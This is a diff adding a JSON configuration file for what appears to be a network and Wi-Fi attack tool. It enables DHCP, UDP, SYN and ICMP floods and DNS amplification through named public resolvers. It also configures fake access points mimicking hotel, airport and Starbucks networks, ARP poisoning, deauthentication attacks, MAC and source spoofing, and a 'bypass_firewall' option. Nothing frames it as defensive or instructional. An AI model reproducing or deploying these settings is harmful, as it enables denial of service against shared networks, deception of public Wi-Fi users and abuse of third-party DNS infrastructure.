@@ -1,0 +1,84 @@
+{
+  "global": {
+    "duration": 120,
+    "interface": "wlan0",
+    "max_targets": 5,
+    "log_level": "info"
+  },
+  "dhcp_flood": {
+    "enabled": true,
+    "threads": 25,
+    "count": 2000,
+    "delay": 0.001
+  },
+  "beacon_flood": {
+    "enabled": true,
+    "threads": 20,
+    "count": 1000,
+    "fake_networks": [
+      "FREE_WIFI_VIP",
+      "Hotel_Guest_Premium", 
+      "Airport_WiFi_Fast",
+      "Starbucks_Premium",
+      "McDonald_Free_VIP"
+    ]
+  },
+  "udp_flood": {
+    "enabled": true,
+    "port": 80,
+    "threads": 50,
+    "size": 1472,
+    "targets": ["gateway", "dns_servers", "broadcast"]
+  },
+  "syn_flood": {
+    "enabled": true,
+    "port": 80,
+    "threads": 40,
+    "alternate_ports": [443, 8080, 3389, 22]
+  },
+  "icmp_flood": {
+    "enabled": true,
+    "threads": 30,
+    "size": 1024,
+    "types": ["ping", "timestamp", "info_request"]
+  },
+  "dns_amplification": {
+    "enabled": true,
+    "threads": 20,
+    "dns_servers": [
+      "8.8.8.8",
+      "8.8.4.4", 
+      "1.1.1.1",
+      "1.0.0.1",
+      "208.67.222.222",
+      "9.9.9.9"
+    ],
+    "query_types": ["ANY", "TXT", "MX", "NS"]
+  },
+  "bandwidth_attack": {
+    "enabled": false,
+    "threads": 100,
+    "packet_size": 65000,
+    "target_bandwidth_mbps": 100
+  },
+  "arp_poison": {
+    "enabled": false,
+    "threads": 10,
+    "targets": "auto_discover",
+    "spoof_gateway": true
+  },
+  "deauth_attack": {
+    "enabled": false,
+    "target_bssid": "",
+    "threads": 15,
+    "reasons": [1, 2, 3, 4, 5, 6, 7, 8, 15, 16],
+    "broadcast": true
+  },
+  "advanced_options": {
+    "randomize_source": true,
+    "spoof_mac": true,
+    "fragment_packets": false,
+    "use_raw_sockets": true,
+    "bypass_firewall": true
+  }
+}
